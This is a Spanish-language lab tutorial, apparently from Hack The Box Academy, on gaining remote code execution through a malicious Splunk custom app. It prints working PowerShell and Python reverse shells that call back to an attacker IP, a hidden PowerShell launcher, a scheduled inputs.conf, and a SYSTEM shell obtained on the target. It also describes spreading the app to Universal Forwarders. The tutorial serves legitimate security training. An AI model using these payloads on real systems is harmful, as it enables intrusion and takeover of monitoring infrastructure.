Como se discutió en la sección anterior, podemos obtener ejecución remota de código en Splunk creando una aplicación personalizada para ejecutar scripts en Python, Batch, Bash o PowerShell. A partir del escaneo de descubrimiento de Nmap, notamos que nuestro objetivo es un servidor Windows. Dado que Splunk viene con Python instalado, podemos crear una aplicación personalizada de Splunk que nos proporcione ejecución remota de código utilizando Python o un script de PowerShell.

---

## Abusing Built-In Functionality

Podemos usar [este](https://github.com/0xjpuff/reverse_shell_splunk) paquete de Splunk para ayudarnos. El directorio `bin` en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Vamos a repasarlo paso a paso.

Para lograr esto, primero necesitamos crear una aplicación personalizada de Splunk utilizando la siguiente estructura de directorios:

```r
tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

El directorio `bin` contendrá cualquier script que pretendamos ejecutar (en este caso, una reverse shell en PowerShell), y el directorio `default` tendrá nuestro archivo `inputs.conf`. Nuestra reverse shell será una línea de comando en PowerShell.

```r
# A simple and small reverse shell. Options and help removed to save space. 
# Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

El archivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) le dice a Splunk qué script ejecutar y cualquier otra condición. Aquí configuramos la aplicación como habilitada y le decimos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre está en segundos, y el input (script) solo se ejecutará si esta configuración está presente.

```r
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Necesitamos el archivo .bat, que se ejecutará cuando la aplicación sea desplegada y ejecutará la línea de comando de PowerShell.

```r
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Una vez que los archivos estén creados, podemos crear un tarball o archivo `.spl`.

```r
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

El siguiente paso es elegir `Install app from file` y subir la aplicación.

`https://10.129.201.50:8000/en-US/manager/search/apps/local`

![](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Antes de subir la aplicación personalizada maliciosa, iniciemos un listener usando Netcat o [socat](https://linux.die.net/man/1/socat).

```r
sudo nc -lnvp 443

listening on [any] 443 ...
```

En la página `Upload app`, haz clic en browse, elige el tarball que creamos anteriormente y haz clic en `Upload`.

`https://10.129.201.50:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal`

![](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

Tan pronto como subamos la aplicación, se recibe una reverse shell ya que el estado de la aplicación se cambiará automáticamente a `Enabled`.

```r
sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

En este caso, obtuvimos una shell como `NT AUTHORTY\SYSTEM`. Si esto fuera una evaluación del mundo real, podríamos proceder a enumerar el objetivo en busca de credenciales en el registro, la memoria o almacenadas en otro lugar del sistema de archivos para usarlas en el movimiento lateral dentro de la red. Si este fuera nuestro punto de entrada inicial en el entorno de dominio, podríamos usar este acceso para comenzar a enumerar el dominio de Active Directory.

Si estuviéramos tratando con un host Linux, necesitaríamos editar el script en Python `rev.py` antes de crear el tarball y subir la aplicación maliciosa personalizada. El resto del proceso sería el mismo, y obtendríamos una conexión de reverse shell en nuestro listener de Netcat y estaríamos listos para continuar.

```r
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Si el host de Splunk comprometido es un servidor de despliegue, probablemente sea posible lograr RCE en cualquier host con Universal Forwarders instalados en ellos. Para enviar una reverse shell a otros hosts, la aplicación debe colocarse en el directorio `$SPLUNK_HOME/etc/deployment-apps` en el host comprometido. En un entorno predominantemente Windows, necesitaremos crear una aplicación utilizando una reverse shell de PowerShell ya que los Universal forwarders no se instalan con Python como el servidor de Splunk.